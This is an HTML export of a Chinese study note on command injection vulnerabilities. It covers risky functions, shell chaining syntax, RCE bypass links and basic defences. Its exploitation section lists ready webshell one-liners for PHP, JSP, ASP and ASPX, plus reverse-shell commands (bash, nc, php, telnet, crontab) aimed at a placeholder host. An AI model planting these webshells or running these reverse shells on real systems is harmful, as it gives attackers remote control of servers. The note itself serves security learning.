<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
<link rel='stylesheet' href='../../../plugins/googleapis/fonts.css'>
<link rel="stylesheet" href="../../../dist/css/markdown.css">
</head>
<body class='typora-export os-windows'><div class='typora-export-content'>
<div id='write'  class=''><ul><li><p><strong><span>命令执行漏洞</span></strong></p><p><span>命令执行漏洞是指攻击者通过注入恶意命令来执行非预期的操作；简单来说就是没有对用户输入的内容充分的验证或过滤，而直接带入到命令执行函数中当成系统化命令被执行。</span></p></li></ul><p></br></p><ul><li><p><strong><span>漏洞危害</span></strong></p><ol><li><p><span>执行任意系统命令，可能导致服务器被完全控制。</span></p></li><li><p><span>敏感信息泄露，如密码、数据库内容等。</span></p></li><li><p><span>对系统进行拒绝服务（DoS）攻击。</span></p></li><li><p><span>执行恶意代码，如安装后门、植入恶意软件等。</span></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>常见漏洞函数</span></strong></p><figure><table><thead><tr><th><span>编程语言</span></th><th><span>执行系统命令的函数</span></th></tr></thead><tbody><tr><td><span>PHP</span></td><td><code>exec()</code><span>、</span><code>shell_exec()</code><span>、</span><code>system()</code><span>、</span><code>passthru()</code><span>、</span><code>proc_open()</code><span>、</span><code>popen()</code></td></tr><tr><td><span>Python</span></td><td><code>os.system()</code><span>、</span><code>subprocess.run()</code><span>、</span><code>subprocess.Popen()</code></td></tr><tr><td><span>Go</span></td><td><code>os/exec.Command()</code><span>、</span><code>os/exec.Run()</code><span>、</span><code>os/exec.Output()</code></td></tr><tr><td><span>Java</span></td><td><code>Runtime.getRuntime().exec()</code><span>、</span><code>ProcessBuilder.command()</code></td></tr><tr><td><span>Node.js</span></td><td><code>child_process.exec()</code><span>、</span><code>child_process.spawn()</code></td></tr></tbody></table></figure></li></ul><p></br></p><ul><li><p><strong><span>Windows&amp;Linux命令语法</span></strong></p><ol><li><p><span>Windows</span></p><ul><li><p><code>&amp;</code><span>：用于连接多个命令，按顺序执行</span></p></li><li><p><code>&amp;&amp;</code><span>：用于连接多个命令，只有前一个命令成功执行后才执行下一个命令</span></p></li><li><p><code>|</code><span>：用于将一个命令的输出作为另一个命令的输入</span></p></li><li><p><code>||</code><span>： 用于连接多个命令，只要前一个命令执行失败，就执行下一个命令</span></p></li><li><p><code>*</code><span>：匹配任意字符序列（可以为空）</span></p></li><li><p><code>?</code><span>：匹配单个字符</span></p></li></ul><ul><li><p><span>更多参考：</span><a href='https://cloud.tencent.com/developer/article/1906124' target="_blank"><span>腾讯社区-Window下CMD命令语法应知应会</span></a></p></li></ul></li><li><p><span>Linux</span></p><ul><li><p><code>;</code><span>：用于连接多个命令，按顺序执行</span></p></li><li><p><code>&amp;</code><span>：用于连接多个命令，将多个命令置于后台运行</span></p></li><li><p><code>&amp;&amp;</code><span>、</span><code>|</code><span>、</span><code>||</code><span>、</span><code>*</code><span>、</span><code>?</code><span>：与Windows一样</span></p></li><li><p><code>[a-z0-9]</code><span>：匹配</span><code>[]</code><span>中的任意字符</span></p></li><li><p><span>更多参考：</span><a href='https://www.cnblogs.com/cxdZero/p/16336753.html' target="_blank"><span>linux常用语法</span></a></p></li></ul></li></ol></li></ul><p></br></p><ul><li><p><strong><span>进一步利用</span></strong></p><ol><li><p><span>写入webshell：</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="php+HTML" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php+html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># 常见的webshell</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># php</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?php</span> <span class="cm-keyword">eval</span>(<span class="cm-variable-2">$_POST</span>[<span class="cm-string">'f4nq1e'</span>]);<span class="cm-meta">?&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?</span><span class="cm-operator">=</span><span class="cm-keyword">eval</span>(<span class="cm-variable-2">$_POST</span>[<span class="cm-variable">f4nq1e</span>]);<span class="cm-meta">?&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?php</span> <span class="cm-builtin">assert</span>(<span class="cm-variable">@$_POST</span>[<span class="cm-string">'f4nq1e'</span>]);<span class="cm-meta">?&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?php</span><span class="cm-variable-2">$fun</span><span class="cm-operator">=</span><span class="cm-variable">create_function</span>(<span class="cm-string">''</span>,<span class="cm-variable-2">$_POST</span>[<span class="cm-string">'f4nq1e'</span>]);<span class="cm-variable-2">$fun</span>();<span class="cm-meta">?&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?php</span><span class="cm-variable">@call_user_func</span>(<span class="cm-builtin">assert</span>,<span class="cm-variable-2">$_POST</span>[<span class="cm-string">'f4nq1e'</span>]);<span class="cm-meta">?&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?php</span><span class="cm-variable">@preg_replace</span>(<span class="cm-string">"/abcde/e"</span>,<span class="cm-variable-2">$_POST</span>[<span class="cm-string">'f4nq1e'</span>],<span class="cm-string">"abcdefg"</span>);<span class="cm-meta">?&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?php</span><span class="cm-variable-2">$a</span><span class="cm-operator">=</span><span class="cm-string">'assert'</span>;<span class="cm-builtin">array_map</span>(<span class="cm-string">"</span><span class="cm-variable-2">$a</span><span class="cm-string">"</span>,<span class="cm-variable-2">$_REQUEST</span>);<span class="cm-meta">?&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?php</span><span class="cm-variable-2">$item</span>[<span class="cm-string">'JON'</span>]<span class="cm-operator">=</span><span class="cm-string">'assert'</span>;<span class="cm-variable-2">$array</span>[]<span class="cm-operator">=</span><span class="cm-variable-2">$item</span>;<span class="cm-variable-2">$array</span>[<span class="cm-number">0</span>][<span class="cm-string">'JON'</span>](<span class="cm-variable-2">$_POST</span>[<span class="cm-string">"f4nq1e"</span>]);<span class="cm-meta">?&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?php</span><span class="cm-variable-2">$a</span><span class="cm-operator">=</span><span class="cm-string">"eval"</span>;<span class="cm-variable-2">$a</span>(<span class="cm-variable">@$_POST</span>[<span class="cm-string">'f4nq1e'</span>]);<span class="cm-meta">?&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># jsp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">%</span> <span class="cm-attribute">out.println(system(request.getParameter(</span><span class="cm-string cm-error">"f4nq1e"</span><span class="cm-attribute">)));</span> <span class="cm-attribute">%</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># asp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">%eval</span> <span class="cm-attribute">request(</span><span class="cm-string cm-error">"f4nq1e"</span><span class="cm-attribute">)%</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">%execute(request(</span><span class="cm-string cm-error">"f4nq1e"</span><span class="cm-attribute">))%</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">%ExecuteGlobal</span> <span class="cm-attribute">request(</span><span class="cm-string cm-error">"f4nq1e"</span><span class="cm-attribute">)%</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># aspx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">%@</span> <span class="cm-attribute">Page</span> <span class="cm-attribute">Language</span>=<span class="cm-string">"Jscript"</span> <span class="cm-attribute">validateRequest</span>=<span class="cm-string">"false"</span> <span class="cm-attribute">%</span><span class="cm-tag cm-bracket">&gt;&lt;</span><span class="cm-tag">%Response.Write(eval(Request.Item[</span><span class="cm-string cm-error">"f4nq1e"</span><span class="cm-attribute">],</span><span class="cm-string cm-error">"unsafe"</span><span class="cm-attribute">));%</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 553px;"></div><div class="CodeMirror-gutters" style="display: none; height: 553px;"></div></div></div></pre><p><span>参考文章：</span><a href='https://zhuanlan.zhihu.com/p/503233032' target="_blank"><span>知乎-命令执行写Webshell总结</span></a></p></li></ol><ol start='2' ><li><p><span>反弹shell：</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="shell" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="shell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># bash反弹shell</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/bin/bash <span class="cm-attribute">-i</span> &gt;&amp; /dev/tcp/xx.xx.xx.xx/9877 <span class="cm-number">0</span>&gt;&amp;1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># nc反弹shell：</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">nc</span> <span class="cm-attribute">-e</span> /bin/sh xx.xx.xx.xx <span class="cm-number">9877</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># php反弹shell</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">php <span class="cm-attribute">-r</span> <span class="cm-string">'$sock=fsockopen("xx.xx.xx.xx",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># telnet反弹shell</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">telnet</span> xx.xx.xx.xx <span class="cm-number">8080</span> | /bin/bash | <span class="cm-builtin">telnet</span> xx.xx.xx.xx <span class="cm-number">9090</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># crontab反弹shell</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">* * * * * /bin/bash <span class="cm-attribute">-i</span> &gt;&amp; /dev/tcp//1234 <span class="cm-number">0</span>&gt;&amp;1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 322px;"></div><div class="CodeMirror-gutters" style="display: none; height: 322px;"></div></div></div></pre><p><span>参考文章：</span><a href='https://xz.aliyun.com/t/14240' target="_blank"><span>先知-反弹shell方式汇总</span></a></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>RCE绕过进阶</span></strong></p><ol><li><p><a href='https://cloud.tencent.com/developer/article/2393061' target="_blank"><span>腾讯社区-命令注入限制绕过</span></a></p></li><li><p><a href='https://www.cnblogs.com/kalixcn/p/18002501' target="_blank"><span>命令执行绕过</span></a></p></li><li><p><a href='https://zhuanlan.zhihu.com/p/391439312?utm_id=0' target="_blank"><span>知乎-命令执行(RCE)面对各种过滤，骚姿势绕过总结</span></a></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>命令执行防御</span></strong></p><ol><li><p><span>输入验证和过滤：对于从用户或外部源接收的所有输入数据，进行严格的验证和过滤。确保只允许预期的输入字符和格式，并拒绝潜在的恶意代码。</span></p></li><li><p><span>权限限制：确保应用程序在执行命令时使用最低特权。不要在命令执行中使用超级用户权限或管理员权限，以降低攻击者可能获得的权限。</span></p></li><li><p><span>沙箱环境：在可能的情况下，将应用程序或相关组件运行在沙箱环境中，以限制其对系统的访问权限。这可以帮助隔离恶意代码的影响，并提供额外的安全层。</span></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>推荐学习文章</span></strong></p><ol><li><p><a href='https://cloud.tencent.com/developer/article/2090713?areaId=106001' target="_blank"><span>腾讯社区-超详细讲解命令执行漏洞</span></a></p></li><li><p><a href='https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.web%E6%BC%8F%E6%B4%9E/12.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/' target="_blank"><span>d4m1ts知识库-命令执行</span></a></p></li><li><p><a href='https://cloud.tencent.com/developer/article/2090709?areaId=106001' target="_blank"><span>腾讯社区-干货 | 命令执行漏洞和代码执行漏洞详解</span></a></p></li></ol></li></ul></div></div>
</body>
</html>